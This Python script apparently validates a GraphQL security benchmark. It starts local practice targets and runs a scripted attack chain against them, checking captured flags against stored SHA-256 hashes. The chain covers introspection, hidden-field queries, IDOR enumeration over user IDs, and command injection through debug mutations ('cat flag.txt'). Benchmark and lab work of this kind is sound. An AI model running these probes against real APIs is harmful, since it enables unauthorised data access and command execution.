#!/usr/bin/env python3
"""GraphQL 基准 · Python 侧独立双语言复刻（纯标准库 urllib + json）。

自实现内省解析 / 隐藏字段直查 / IDOR 遍历 / 隐藏调试 mutation 探测，
逐场景与 graphql_benchmark.json 的 SHA-256 比对。
"""
import hashlib
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
BENCH = os.path.join(HERE, "graphql_benchmark.json")
RANGE_PY = os.path.join(HERE, "live_target", "gql_range.py")

RE_FIELD_NAME = re.compile(r'"name"\s*:\s*"([A-Za-z_][A-Za-z0-9_]*)"')
RE_FLAG = re.compile(r"(?i)[a-z0-9_]*flag[a-z0-9_]*\{[^}\x00-\x1f]{3,}\}")

HIDDEN_FIELDS = ["secretFlag", "flag", "hiddenFlag", "debugFlag", "allFlags"]
USER_IDS = ["1", "2", "0", "100", "admin"]


def wait_ready(port, timeout=12.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            urllib.request.urlopen("http://127.0.0.1:%d/" % port, timeout=1)
            return True
        except urllib.error.HTTPError:
            return True  # 任何 HTTP 响应（含 404/405）都说明服务已监听
        except Exception:
            time.sleep(0.1)
    return False


def gql(port, path, query):
    req = urllib.request.Request(
        "http://127.0.0.1:%d%s" % (port, path),
        data=json.dumps({"query": query}).encode(),
        headers={"Content-Type": "application/json"})
    try:
        return urllib.request.urlopen(req, timeout=8).read().decode()
    except Exception:
        return ""


def extract_flag(resp):
    for m in RE_FLAG.findall(resp):
        return m
    return ""


def introspect_fields(resp):
    return RE_FIELD_NAME.findall(resp or "")


def exploit(port):
    found = []
    for path in ("/graphql", "/api/graphql"):
        # 1) 内省
        q_names = introspect_fields(gql(port, path,
            "{ __schema { queryType { fields { name } } } }"))
        m_names = introspect_fields(gql(port, path,
            "{ __schema { mutationType { fields { name } } } }"))
        # 2) 隐藏字段直查
        for name in HIDDEN_FIELDS:
            if name in q_names:
                f = extract_flag(gql(port, path, "{ %s }" % name))
                if f:
                    found.append(f)
                    return found
        # 3) IDOR
        if "user" in q_names or not q_names:
            for uid in USER_IDS:
                resp = gql(port, path,
                    '{ user(id:"%s") { name role notes email description comment } }' % uid)
                f = extract_flag(resp)
                if f:
                    found.append(f)
                    return found
        # 4) 隐藏调试 mutation
        for name in m_names:
            low = name.lower()
            if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", name):
                continue
            if not any(k in low for k in ("exec", "cmd", "run", "debug")):
                continue
            for cmd in ("cat flag.txt", "type flag.txt", "cat ./flag.txt"):
                f = extract_flag(gql(port, path,
                    'mutation { %s(cmd:"%s") }' % (name, cmd)))
                if f:
                    found.append(f)
                    return found
    return found


def main():
    doc = json.load(open(BENCH, encoding="utf-8"))["problems"]
    ports = {"gql_introspection": 18221, "gql_idor": 18222, "gql_mutation": 18223}
    hit = 0
    for scene, port in ports.items():
        p = subprocess.Popen([sys.executable, RANGE_PY, str(port), scene],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            if not wait_ready(port):
                print("%-18s ❌ 靶场未就绪" % scene)
                continue
            cands = exploit(port)
            ok = any(hashlib.sha256(c.encode()).hexdigest() == doc[scene]["flag_sha256"]
                     for c in cands)
            if ok:
                hit += 1
                print("%-18s ✅ SHA-256 校验通过" % scene)
            else:
                print("%-18s ❌ 未命中，got=%s" % (scene, cands[:2]))
        finally:
            p.kill()
    print("Python 侧 GraphQL：%d/3" % hit)
    return 0 if hit == 3 else 1


if __name__ == "__main__":
    sys.exit(main())
